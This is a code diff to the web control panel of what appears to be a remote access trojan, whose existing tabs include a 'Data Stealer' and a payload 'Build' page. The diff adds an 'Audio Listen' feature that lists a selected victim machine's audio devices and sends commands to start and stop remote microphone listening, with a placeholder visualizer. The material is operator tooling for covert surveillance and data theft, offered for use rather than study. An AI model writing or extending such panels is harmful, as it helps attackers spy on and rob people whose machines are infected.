@@ -634,6 +634,18 @@
       animation: pulse 2s infinite;
     }
 
+    /* Audio visualizer */
+    .audio-visualizer {
+      margin-top: 1.5rem;
+      text-align: center;
+    }
+
+    #audioCanvas {
+      background: rgba(0, 0, 0, 0.3);
+      border-radius: 8px;
+      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
+    }
+
     /* Responsive */
     @media (max-width: 992px) {
       .app-container {
@@ -671,6 +683,9 @@
         </button>
         <button class="tab-button" onclick="showTab('stealer')">
           <i class="fas fa-search"></i> Data Stealer
+        </button>
+        <button class="tab-button" onclick="showTab('audio')">
+          <i class="fas fa-microphone"></i> Audio Listen
         </button>
         <button class="tab-button" onclick="showTab('build')">
           <i class="fas fa-cogs"></i> Build
@@ -805,6 +820,43 @@
           </div>
         </div>
       </div>
+        <div id="audioTab" class="tab-content">
+          <div class="card">
+            <div class="card-header">
+              <h2 class="card-title"><i class="fas fa-microphone"></i> Audio Listening</h2>
+              <div class="action-buttons">
+                <button class="btn btn-primary" onclick="loadAudioDevices()">
+                  <i class="fas fa-refresh"></i> Refresh Devices
+                </button>
+                <button class="btn btn-success" onclick="startAudioListen()" id="startAudioBtn">
+                  <i class="fas fa-play"></i> Start Listening
+                </button>
+                <button class="btn btn-danger" onclick="stopAudioListen()" id="stopAudioBtn" style="display: none;">
+                  <i class="fas fa-stop"></i> Stop Listening
+                </button>
+              </div>
+            </div>
+            
+            <div class="input-group">
+              <label>Audio Devices:</label>
+              <select id="audioDeviceSelect" class="input-field">
+                <option value="">Select audio device...</option>
+              </select>
+            </div>
+            
+            <div class="input-group">
+              <label>Audio Status:</label>
+              <div class="output-console" id="audioStatus">
+[System] Ready to listen to audio devices
+              </div>
+            </div>
+            
+            <div class="audio-visualizer" id="audioVisualizer" style="display: none;">
+              <canvas id="audioCanvas" width="400" height="100" style="border: 1px solid rgba(255,255,255,0.3); border-radius: 8px;"></canvas>
+            </div>
+          </div>
+        </div>
+        
         <div id="buildTab" class="tab-content">
           <div class="card">
             <div class="card-header">
@@ -1449,11 +1501,208 @@
       } else if (msg.type === "stealer") {
         document.getElementById("stealerData").textContent = msg.data;
         downloadBtn.style.display = 'block';
+      } else if (msg.type === "audio_devices") {
+        handleAudioDevices(msg.data);
+      } else if (msg.type === "audio_data") {
+        handleAudioData(msg.data);
       } else if (msg.type === "hello") {
         // Handle hello message if needed
       }
     };
     
+    // Audio functions
+    let audioContext = null;
+    let audioAnalyser = null;
+    let audioDataArray = null;
+    let isListening = false;
+    let selectedAudioDevice = null;
+
+    function loadAudioDevices() {
+      if (!selectedClient) {
+        document.getElementById("audioStatus").textContent = "[Error] No client selected";
+        return;
+      }
+
+      document.getElementById("audioStatus").textContent = "[System] Loading audio devices...";
+      
+      fetch(`/send/${selectedClient}`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ type: "get_audio_devices", data: "" })
+      })
+      .then(res => {
+        if (res.ok) {
+          document.getElementById("audioStatus").textContent = "[System] Audio devices request sent";
+        } else {
+          document.getElementById("audioStatus").textContent = "[Error] Failed to get audio devices";
+        }
+      })
+      .catch(error => {
+        document.getElementById("audioStatus").textContent = "[Error] " + error.message;
+      });
+    }
+
+    function handleAudioDevices(devicesJson) {
+      try {
+        const devices = JSON.parse(devicesJson);
+        const select = document.getElementById("audioDeviceSelect");
+        select.innerHTML = '<option value="">Select audio device...</option>';
+        
+        if (devices.input && devices.input.length > 0) {
+          const inputGroup = document.createElement("optgroup");
+          inputGroup.label = "Input Devices";
+          devices.input.forEach(device => {
+            const option = document.createElement("option");
+            option.value = device.Name;
+            option.textContent = device.Name;
+            inputGroup.appendChild(option);
+          });
+          select.appendChild(inputGroup);
+        }
+        
+        if (devices.output && devices.output.length > 0) {
+          const outputGroup = document.createElement("optgroup");
+          outputGroup.label = "Output Devices";
+          devices.output.forEach(device => {
+            const option = document.createElement("option");
+            option.value = device.Name;
+            option.textContent = device.Name;
+            outputGroup.appendChild(option);
+          });
+          select.appendChild(outputGroup);
+        }
+        
+        document.getElementById("audioStatus").textContent = `[System] Found ${(devices.input?.length || 0) + (devices.output?.length || 0)} audio devices`;
+      } catch (e) {
+        document.getElementById("audioStatus").textContent = "[Error] Failed to parse audio devices: " + e.message;
+      }
+    }
+
+    function startAudioListen() {
+      if (!selectedClient) {
+        document.getElementById("audioStatus").textContent = "[Error] No client selected";
+        return;
+      }
+
+      const deviceSelect = document.getElementById("audioDeviceSelect");
+      selectedAudioDevice = deviceSelect.value;
+      
+      if (!selectedAudioDevice) {
+        document.getElementById("audioStatus").textContent = "[Error] Please select an audio device";
+        return;
+      }
+
+      document.getElementById("audioStatus").textContent = `[System] Starting audio listening on ${selectedAudioDevice}...`;
+      
+      fetch(`/send/${selectedClient}`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ type: "start_audio_listen", data: selectedAudioDevice })
+      })
+      .then(res => {
+        if (res.ok) {
+          isListening = true;
+          document.getElementById("startAudioBtn").style.display = "none";
+          document.getElementById("stopAudioBtn").style.display = "inline-block";
+          document.getElementById("audioVisualizer").style.display = "block";
+          document.getElementById("audioStatus").textContent = `[System] Listening to ${selectedAudioDevice}`;
+          initAudioVisualizer();
+        } else {
+          document.getElementById("audioStatus").textContent = "[Error] Failed to start audio listening";
+        }
+      })
+      .catch(error => {
+        document.getElementById("audioStatus").textContent = "[Error] " + error.message;
+      });
+    }
+
+    function stopAudioListen() {
+      if (!selectedClient) {
+        return;
+      }
+
+      fetch(`/send/${selectedClient}`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ type: "stop_audio_listen", data: "" })
+      })
+      .then(res => {
+        if (res.ok) {
+          isListening = false;
+          document.getElementById("startAudioBtn").style.display = "inline-block";
+          document.getElementById("stopAudioBtn").style.display = "none";
+          document.getElementById("audioVisualizer").style.display = "none";
+          document.getElementById("audioStatus").textContent = "[System] Audio listening stopped";
+        }
+      })
+      .catch(error => {
+        document.getElementById("audioStatus").textContent = "[Error] " + error.message;
+      });
+    }
+
+    function handleAudioData(audioDataBase64) {
+      if (!isListening) return;
+      
+      try {
+        // В реальной реализации здесь будет обработка аудио данных
+        // Для демонстрации просто обновляем статус
+        document.getElementById("audioStatus").textContent = `[System] Receiving audio data from ${selectedAudioDevice}...`;
+        
+        // Здесь можно добавить визуализацию аудио
+        updateAudioVisualizer(audioDataBase64);
+      } catch (e) {
+        console.error("Error handling audio data:", e);
+      }
+    }
+
+    function initAudioVisualizer() {
+      const canvas = document.getElementById("audioCanvas");
+      const ctx = canvas.getContext("2d");
+      
+      // Очищаем канвас
+      ctx.clearRect(0, 0, canvas.width, canvas.height);
+      
+      // Рисуем базовую линию
+      ctx.strokeStyle = "rgba(108, 92, 231, 0.5)";
+      ctx.lineWidth = 2;
+      ctx.beginPath();
+      ctx.moveTo(0, canvas.height / 2);
+      ctx.lineTo(canvas.width, canvas.height / 2);
+      ctx.stroke();
+    }
+
+    function updateAudioVisualizer(audioDataBase64) {
+      const canvas = document.getElementById("audioCanvas");
+      const ctx = canvas.getContext("2d");
+      
+      // Очищаем канвас
+      ctx.clearRect(0, 0, canvas.width, canvas.height);
+      
+      // Рисуем базовую линию
+      ctx.strokeStyle = "rgba(108, 92, 231, 0.5)";
+      ctx.lineWidth = 2;
+      ctx.beginPath();
+      ctx.moveTo(0, canvas.height / 2);
+      ctx.lineTo(canvas.width, canvas.height / 2);
+      ctx.stroke();
+      
+      // Рисуем визуализацию аудио (демо)
+      ctx.strokeStyle = "#6c5ce7";
+      ctx.lineWidth = 3;
+      ctx.beginPath();
+      
+      for (let x = 0; x < canvas.width; x++) {
+        const y = canvas.height / 2 + Math.sin(x * 0.1 + Date.now() * 0.01) * 20;
+        if (x === 0) {
+          ctx.moveTo(x, y);
+        } else {
+          ctx.lineTo(x, y);
+        }
+      }
+      
+      ctx.stroke();
+    }
+
     // Initialize when page loads
     window.onload = initUI;
     
